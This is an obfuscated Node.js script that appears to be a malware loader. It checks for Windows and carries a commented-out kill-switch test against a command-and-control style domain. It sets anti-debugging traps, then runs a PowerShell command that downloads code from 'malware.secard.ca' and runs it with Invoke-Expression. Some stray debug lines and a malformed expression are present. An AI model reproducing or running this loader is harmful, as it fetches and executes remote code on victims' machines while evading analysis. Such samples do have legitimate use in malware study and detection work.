const _0xf64dc7 = require('https'), { execSync: execute } = require('child_process');
var con1 = check_http('https://www.microsoft.com'),
  con2 = check_http('https://www.twitter.com'),
  con3 = check_http('https://www.facebook.com'),
  con4 = check_http('https://commandandcontrolkillswitch3154.com');
// if (!con1 || !con2 || !con3 || con4) {
//   console['log']('Error Code 1: Check Failed!');
//   return;
// }
if (!is_windows()) {
  console['log']('Error Code 2: Check Failed!');
  return;
}
(function () {
  var _0x26f855;
  try {
    var _0x3bba14 = function () {
      return function () {}.constructor("return this")();
    };
    _0x26f855 = _0x3bba14();
  } catch (_0x18cee0) {
    _0x26f855 = window;
  }
  _0x26f855['setInterval'](_0x343b81, 1000);
})();
console.log(1)

var cmd = '(iwr "http://malware.secard.ca" -UseBasicParsing).Content | ForEach-Object { Invoke-Expression $_ }';
execute_command(cmd);
function check_http(_0x28cee3) {
  var _0x14d8ad = function () {
    var _0x50bfd5 = true;
    return function (_0x4e728f, _0x48e076) {
      var _0x37048c = _0x50bfd5 ? function () {
        if (_0x48e076) {
          var _0x550ba2 = _0x48e076['apply'](_0x4e728f, arguments);
          return _0x48e076 = null, _0x550ba2;
        }
      } : function () {};
      return _0x50bfd5 = false, _0x37048c;
    };
  }();
  return function () {
    _0x14d8ad(this, function () {
      var _0x472bf3 = new RegExp('function *\\( *\\)'),
        _0x1e3db7 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        _0x437f37 = _0x343b81('init');
      if (!_0x472bf3['test'](_0x437f37 + 'chain') || !_0x1e3db7['test'](_0x437f37 + 'input')) {
        _0x437f37('0');
      } else {
        _0x343b81();
      }
    })();
  }(), new Promise(_0x360dc4 => {
    _0xf64dc7['get'](_0x28cee3, _0x38ecb4 => {
      _0x360dc4(_0x38ecb4['statusCode'] === 200);
    })['on']('error', () => {
      _0x360dc4(false);
    });
  });
}
function is_windows() {
  try {
    const _0x3801b4 = execute('wmic os get Caption')['toString']();
    return _0x3801b4['includes']('Windows');
  } catch (_0x125419) {
    return console['error']('Error executing command:', _0x125419['message']), false;
  }
}
function execute_command(_0x4dd1b) {
  execute('powershell.exe -command "' + _0x4dd1b + '"', (_0x35b1a0, _0x55aa67, _0x3a09b0) => {
    if (_0x35b1a0) {
      console['error']('Error executing PowerShell command:', _0x35b1a0['message']);
      return;
    }
    if (_0x3a09b0) {
      console['error']('PowerShell command execution encountered an error:', _0x3a09b0);
      return;
    }
    console['log']('PowerShell command executed successfully. Output:', _0x55aa67);
  });
}
function _0x343b81(_0x13b4ad) {
  function _0x470273(_0x286ffa) {
    if (typeof _0x286ffa === 'string') {
      return function (_0x275205) {}['constructor']('while (true) {}')['apply']('counter');
    } else {
        console.log("???", _0x286ffa, '' + _0x286ffa / _0x286ffa, ('' + _0x286ffa / _0x286ffa)['length'])
      ('' + _0x286ffa / _0x286ffa)['length'] !== 1 || _0x286ffa % 0x14 === 0 ? function () {
        return true;
      }['constructor']('debugger')['call']('action') : function () {
        return false;
      }['constructor']('debugger')['apply']('stateObject');
    }
    _0x470273(++_0x286ffa);
  }
  try {
    if (_0x13b4ad) return _0x470273; else _0x470273(0x0);
  } catch (_0x1ddcb9) {}
}
console.log(2)